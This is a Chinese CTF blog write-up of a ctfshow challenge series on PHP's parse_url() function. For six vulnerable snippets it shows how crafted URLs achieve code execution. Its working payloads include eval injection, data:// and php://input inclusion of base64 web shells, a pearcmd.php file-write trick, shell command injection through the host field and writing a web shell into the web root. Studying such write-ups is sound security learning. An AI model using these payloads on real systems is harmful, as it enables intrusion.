---
title: "PARSE_URL"
date: 2023-05-17T23:16:11+08:00
categories: ["ctfshow"]
---

# 每周大挑战——PARSE_URL

## parse_url()函数

此函数返回一个关联数组，包含现有 URL 的各种组成部分。

如果缺少了其中的某一个，则不会为这个组成部分创建数组项。

对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）

```
parse_url — 解析 URL，返回其组成部分

print_r(parse_url('http://username:password@127.0.0.1:8080/index.php?id=1#abc'));
输出为:
Array
(
    [scheme] => http
    [host] => 127.0.0.1
    [port] => 8080
    [user] => username
    [pass] => password
    [path] => /index.php
    [query] => id=1
    [fragment] => abc
)
```

## 第一关

```php
$data = parse_url($_GET['u']);

eval($data['host']);
```

#### 题目分析

```php
<?php

$data = parse_url("http://system('ls /');");

echo "host: ".$data['host']."\n";
echo "path: ".$data['path'];

?>

// 输出
host: system('ls 
path: /');

因为parse函数把/后面的内容自动作为path的内容，所以需要将/替换掉，可以利用参数逃逸
```

#### payload

```
?u=http://eval($_GET[1]);&1=system("ls /");
?u=http://eval($_GET[1]);&1=system("tac /flag_is_here.txt");

?u=http://eval($_POST[1]);
POST: 1=system("ls /");
1=system("tac /flag_is_here.txt");

/?u=aa://eval(base64_decode('c3lzdGVtKCJscyAvIik7'));/aaa
/?u=aa://eval(base64_decode('c3lzdGVtKCJjYXQgL2ZsYWdfaXNfaGVyZS50eHQiKTs='));/aaa
```

## 第二关

```php
$data = parse_url($_GET['u']);

include $data['host'].$data['path'];
```

#### 题目分析

```php
在 data 后面有两个冒号，因为最后一个冒号会被当做端口前的那个冒号，所以需要多打一个冒号才能让 host=data:
path 在识别的时候会被带上前面的 /, 所以只用再加一个就能构造了

<?php

$data = parse_url("http://data:1//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==");

print_r($data);

echo $data['host'].$data['path'];

?>
输出结果：
Array
(
    [scheme] => http
    [host] => data
    [port] => 1
    [path] => //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
)
data//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
    

<?php

$data = parse_url("http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==");

print_r($data);

echo $data['host'].$data['path'];

?>
输出结果：
Array
(
    [scheme] => http
    [host] => data:
    [path] => //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
)
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==


<?php

$data = parse_url("http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==");

print_r($data);

echo $data['host'].$data['path'];

?>
输出结果：
Array
(
    [scheme] => http
    [path] => data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
)
PHP Notice:  Undefined index: host in D:\CODE_python\1.php on line 7

Notice: Undefined index: host in D:\CODE_python\1.php on line 7
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

#### payload

```
?u=http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
// <?php phpinfo(); ?>

?u=http://data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
// <?php eval($_POST[1]); ?>
POST: 1=system("ls /");
POST: 1=system("tac /_f1ag_1s_h3re.txt");

?u=http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

```
?u=http://php:://input
POST: <?php phpinfo(); ?>
```

```
/?u=ctfshow://data:://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL19mKicpOz8%2b
```

## 第三关

```php
$data = parse_url($_GET['u']);

include $data['scheme'].$data['path'];
```

#### 分析

```php
scheme 和 path 配合，scheme 是 http

http:// 是可以省略掉两个斜杠的
http://和http:是一样的结果，因为这个函数只需要识别冒号前面的为http
而且在冒号后面的如果接的不是//，后面的内容就会被识别为 path 而不是 host

<?php

$data = parse_url("data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==");

print_r($data);

echo $data['scheme'].$data['path'];

?>
输出结果：
Array
(
    [scheme] => data
    [path] => ://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
)
data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==


<?php

$data = parse_url("data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==");

print_r($data);

echo $data['scheme'].$data['path'];

?>
输出结果：
Array
(
    [scheme] => data
    [host] => text
    [path] => /plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
)
data/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
```

#### payload

```
?u=data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
// <?php eval($_POST[1]); ?>
POST: 1=system("ls /");
POST: 1=system("tac /_f1a_g_1s_h3re");
```

```
?u=php:://input
POST: <?php phpinfo(); ?>
```

```
?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php&aaaa+config-create+/var/www/html/<?=`$_POST[1]`;?>+1.php

1=ls /
```

## 第四关

```php
$data = parse_url($_GET['u']);

system($data['host']);
```

#### 知识点

```
${PWD} /var/www/html
${PWD::1} /
```

#### payload

```
host会取最后一个冒号作为port的起始标志，最后需要加冒号，防止构造的paylaod被在中间截断
?u=http://ls ${PWD::1}:
?u=http://tac ${PWD::1}1_f1ag_1s_h3re:
```

```
?u=ctfshow://`echo 'Y2F0IC8xX2YxYWdfMXNfaDNyZQ=='|base64 -d`/h1xa

Array
(
    [scheme] => ctfshow
    [host] => `echo 'Y2F0IC8xX2YxYWdfMXNfaDNyZQ=='|base64 -d`
    [path] => /h1xa
)
```

```
?u=http://pwd;cd ..;pwd
结果：/var/www/html(第一个pwd) /var/www(第二个pwd)
使用cd切换目录之后，两次的pwd执行结果不同，代表切换目录成功

?u=http://cd ..;cd ..;cd ..;cat 1_f1ag_1s_h3re
一直切换到根目录，然后找flag
```

## 第五关

```php
extract(parse_url($_GET['u']));

include $$$$$$host;
```

#### 题目分析

```
变量覆盖
```

#### 知识点

```
extract()：从数组中将变量导入到当前的符号表
parse_url()：返回的就是数组，相当于把数组的key变成了当前文件内的变量，数组的value就是变量的值

print_r(parse_url('http://username:password@127.0.0.1:8080/index.php?id=1#abc'));
输出为:
Array
(
    [scheme] => http
    [host] => 127.0.0.1
    [port] => 8080
    [user] => username
    [pass] => password
    [path] => /index.php
    [query] => id=1
    [fragment] => abc
)
```

#### payload

```
$host = scheme
$$host = $scheme = user
$$$host = $user = pass
$$$$host = $pass = query
$$$$$host = $query = fragment
$$$$$$host = $fragment
这里变量覆盖，不用port和path，大概因为port为端口，是数字，path前面会自带/

?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,<?php system("ls /");?>
?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,<?php system("tac /_f1ag_1s_h3ree");?>
注意：这里#需要进行%23编码，如果不写%23直接写#，#后的内容会被浏览器直接过滤掉。

?u=user://pass:query@scheme/?fragment%23data://,<?php system('cat /_f1ag_1s_h3ree');?>
?u=user://pass:query@scheme:3389/aaa?fragment%23php://input
```

## 第六关

```php
$data = parse_url($_GET['u']);

file_put_contents($data['path'], $data['host']);
```

#### 题目分析

```php
path前面自带一个/, 不能访问根目录，需要写绝对路径到当前目录
不能有？，因为会被读取为query的值
长标签的后面的结束标签 </script> 有一个斜杠，后面的会被当成 path 处理，在script中可以没有 </script > 结束符号，只不过往后的所有代码都会被识别为script

file_put_contents()函数将host的值作为内容写入path的值为文件名的文件中。

<?php

$data = parse_url("http://<script language='php'>eval($_POST[1]);/var/www/html/1.php");

print_r($data);

echo $data['host'];

?>
输出结果：
Array
(
    [scheme] => http
    [host] => <script language='php'>eval();
    [path] => /var/www/html/1.php
)
<script language='php'>eval();


<?php

$data = parse_url("http://<?php eval($_POST[1]); ?>/var/www/html/1.php");

print_r($data);

echo $data['host'];

?>
输出结果：
Array
(
    [scheme] => http
    [host] => <
    [query] => php eval(); ?>/var/www/html/1.php
)
<
    
    
<?php

$data = parse_url('http://<script language="php"> eval($_POST[1]); </script>/var/www/html/1.php');

print_r($data);

echo $data['host'];

?>
输出结果：
Array
(
    [scheme] => http
    [host] => <script language="php"> eval($_POST[1]); <
    [path] => /script>/var/www/html/1.php
)
<script language="php"> eval($_POST[1]); <
```

#### 知识点

##### php常用标签

```
1.<?php ?>
2.<? ?>
3.<script language="php"> </script>
```

#### payload

```
/?u=http://<script language='php'>eval($_POST[1]);/var/www/html/1.php

http://5708d4ed-1067-4a90-9eb1-138bc4931d7e.challenge.ctf.show/1.php

1=system("ls /");
1=system("tac /_f1a_g_1s_h3re");
```

